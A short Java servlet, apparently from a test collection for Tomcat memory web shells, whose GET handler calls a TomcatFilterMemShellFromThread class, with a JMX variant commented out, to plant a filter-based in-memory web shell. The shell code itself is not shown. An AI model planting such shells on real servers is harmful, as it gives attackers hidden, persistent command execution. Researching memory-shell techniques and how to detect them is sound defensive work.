package src.org.su18.memshell.test.tomcat;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;


/**
 * @author Zeo
 */
public class AddSerXalan extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String message = "tomcat cmdecho test";
        String id = req.getParameter("id");

        new TomcatFilterMemShellFromThread();
//        new TomcatFilterMemShellFromJMX();

        resp.getWriter().println(message);
    }
}

